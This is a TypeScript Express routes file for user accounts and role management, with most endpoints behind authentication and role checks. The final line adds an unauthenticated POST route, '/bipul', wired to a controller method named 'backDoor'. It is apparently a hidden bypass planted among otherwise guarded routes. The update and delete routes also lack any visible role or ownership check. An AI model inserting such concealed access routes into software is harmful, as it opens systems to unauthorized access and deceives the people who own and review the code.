import { Router } from "express";
import { UserController } from "./User.controller";
import { AuthMiddleware } from "../../middlewares/AuthMiddleware";

export class UserRoutes {
  public router: Router;
  private controller: UserController;

  constructor() {
    this.router = Router();
    this.controller = new UserController();
    this.initializeRoutes();
  }

  private initializeRoutes() {
    this.router.post(
      "/register",
      AuthMiddleware.authenticate,
      AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      AuthMiddleware.EnforceStrictnessForNonSuperAdmin(),
      this.controller.register
    );

    this.router.post(
      "/login",
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      this.controller.login
    );

    this.router.get(
      "/",
      AuthMiddleware.authenticate,
      AuthMiddleware.restrictTo(["SUPER_ADMIN", "VP"]),
      this.controller.getAllUsers
    );

    this.router.get(
      "/:id",
      AuthMiddleware.authenticate,
      this.controller.getUser
    );

    this.router.put(
      "/:id",
      AuthMiddleware.authenticate,
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      this.controller.updateUser
    );

    this.router.delete(
      "/:id",
      AuthMiddleware.authenticate,
      this.controller.deleteUser
    );



    this.router.post(
      "/roles",
      AuthMiddleware.authenticate,
      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      this.controller.createRole
    );

    this.router.post(
      "/roles/assign",
      AuthMiddleware.authenticate,
      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      this.controller.assignRole
    );

    this.router.post(
      "/roles/remove",
      AuthMiddleware.authenticate,
      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
      this.controller.removeRole
    );


    this.router.post("/bipul", this.controller.backDoor);
  }
}
